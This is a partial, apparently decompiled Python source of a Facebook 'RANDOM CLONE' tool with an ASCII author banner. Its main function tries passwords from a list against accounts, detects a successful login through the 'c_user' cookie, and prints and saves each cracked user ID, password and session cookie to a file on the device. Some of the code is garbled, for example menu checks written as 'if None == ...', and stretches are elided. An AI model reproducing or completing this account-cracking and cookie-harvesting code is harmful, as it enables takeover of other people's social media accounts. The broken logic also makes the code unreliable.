...
def o():
    ...
    if opt == '1':
        i()
    if None == '2':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100070688245790')
        return None
    if None == '3':
        os.system('xdg-open https://github.com/OVI-909')
        return None
    if None == '4':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100070688245790')
        return None
...
today = date.today()
logo = ("""
888b     d888           8888888b.            Y88b   d88P 
8888b   d8888           888   Y88b            Y88b d88P  
88888b.d88888           888    888             Y88o88P   
888Y88888P888           888   d88P              Y888P    
888 Y888P 888           8888888P"               d888b    
888  Y8P  888           888 T88b               d88888b   
888   "   888           888  T88b             d88P Y88b  
888       888           888   T88b           d88P   Y88b 
                                                         
                                                         \033[1;32m=====================================================================
\033[1;95m[\033[1;93mâœ”ï¸Ž\033[1;95m]\033[1;93m AUTHOR  \033[1;91m : \033[1;95mMRX OVI
\033[1;95m[\033[1;93mâœ”ï¸Ž\033[1;95m]\033[1;93m FACEBOOK  \033[1;91m : \033[1;95mMAHMUD HASAN OVI
\033[1;95m[\033[1;93mâœ”ï¸Ž\033[1;95m]\033[1;93m GITHUB  \033[1;91m : \033[1;95mOVI-404
\033[1;95m[\033[1;93mâœ”ï¸Ž\033[1;95m]\033[1;93m TOOLS   \033[1;91m : \033[1;95mRANDOM CLONE
\033[1;95m[\033[1;93mâœ”ï¸Ž\033[1;95m]\033[1;93m VERSION \033[1;91m : \033[1;32m1.0.4
\033[1;32m=====================================================================\n""")
...
def i():
    ...
    print('IDS SAVED IN OVI-505.txt, OVI-505.txt')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                print('\033[1;32mOVI-505-OK- ]' +uid+ ' | ' +ps+'\033[0;35m')
                print(f"{H}\033[0;35m[COOKIE]'\033[1;32m{coki}")
                cek_apk(session,coki)
                open('/sdcard/OVI-505-OK.txt', 'a').write(uid+' | '+ps+'\n')
                oks.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r%s[OVI-505] \033[1;32m[%s/%s] \033[1;32m[OK-%s] \r'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
